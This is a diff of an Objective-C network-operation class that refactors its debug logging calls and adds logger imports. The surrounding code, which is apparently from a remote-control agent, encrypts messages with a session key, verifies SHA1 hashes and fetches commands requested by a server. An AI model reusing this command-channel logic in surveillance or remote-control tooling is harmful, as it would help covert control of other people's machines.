@@ -15,7 +15,8 @@
 #import "NSMutableData+AES128.h"
 #import "NSMutableData+SHA1.h"
 
-//#define DEBUG_ID_NOP
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @implementation IDNetworkOperation
@@ -30,7 +31,7 @@
       mCommands  = [[NSMutableArray alloc] init];
       
 #ifdef DEBUG_ID_NOP
-      infoLog(ME, @"mTransport: %@", mTransport);
+      infoLog(@"mTransport: %@", mTransport);
 #endif
       return self;
     }
@@ -47,7 +48,7 @@
 - (BOOL)perform
 {
 #ifdef DEBUG_ID_NOP
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -85,7 +86,7 @@
   [message appendData: messageSha];
   
 #ifdef DEBUG_ID_NOP
-  infoLog(ME, @"message: %@", message);
+  infoLog(@"message: %@", message);
 #endif
   
   //
@@ -102,7 +103,7 @@
   [decData decryptWithKey: gSessionKey];
   
 #ifdef DEBUG_ID_NOP
-  infoLog(ME, @"decrypted data: %@", decData);
+  infoLog(@"decrypted data: %@", decData);
 #endif
   
   //
@@ -133,7 +134,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_ID_NOP
-      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
+      errorLog(@"exception on sha makerange (%@)", [e reason]);
 #endif
       
       return NO;
@@ -142,14 +143,14 @@
   shaLocal = [shaLocal sha1Hash];
   
 #ifdef DEBUG_ID_NOP
-  infoLog(ME, @"shaRemote: %@", shaRemote);
-  infoLog(ME, @"shaLocal : %@", shaLocal);
+  infoLog(@"shaRemote: %@", shaRemote);
+  infoLog(@"shaLocal : %@", shaLocal);
 #endif
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
 #ifdef DEBUG_ID_NOP
-      errorLog(ME, @"sha mismatch");
+      errorLog(@"sha mismatch");
 #endif
       
       [message release];
@@ -162,7 +163,7 @@
   if (responseCommand != PROTO_OK)
     {
 #ifdef DEBUG_ID_NOP
-      errorLog(ME, @"response != PROTO_OK (%d)", responseCommand);
+      errorLog(@"response != PROTO_OK (%d)", responseCommand);
 #endif
       
       [message release];
@@ -181,7 +182,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_ID_NOP
-      errorLog(ME, @"exception on serverTime makerange (%@)", [e reason]);
+      errorLog(@"exception on serverTime makerange (%@)", [e reason]);
 #endif
       
       //return NO;
@@ -189,7 +190,7 @@
   
 #ifdef DEBUG_ID_NOP
   NSDate *givenDate = [NSDate dateWithTimeIntervalSince1970: serverTime];
-  infoLog(ME, @"givenDate: %@", givenDate);
+  infoLog(@"givenDate: %@", givenDate);
 #endif
   
   uint32_t numOfCommands = 0;
@@ -202,14 +203,14 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_ID_NOP
-      errorLog(ME, @"exception on numOfCommands makerange (%@)", [e reason]);
+      errorLog(@"exception on numOfCommands makerange (%@)", [e reason]);
 #endif
     }
   
   if (numOfCommands == 0)
     {
 #ifdef DEBUG_ID_NOP
-      warnLog(ME, @"No commands requested from the server");
+      warnLog(@"No commands requested from the server");
 #endif
       
       [message release];
@@ -220,7 +221,7 @@
     }
   
 #ifdef DEBUG_ID_NOP
-  infoLog(ME, @"We have (%d) command(s) requested from the server", numOfCommands);
+  infoLog(@"We have (%d) command(s) requested from the server", numOfCommands);
 #endif
   
   //
@@ -236,7 +237,7 @@
       @catch (NSException *e)
         {
 #ifdef DEBUG_ID_NOP
-          errorLog(ME, @"exception on command makerange (%@)", [e reason]);
+          errorLog(@"exception on command makerange (%@)", [e reason]);
 #endif
           
           continue;
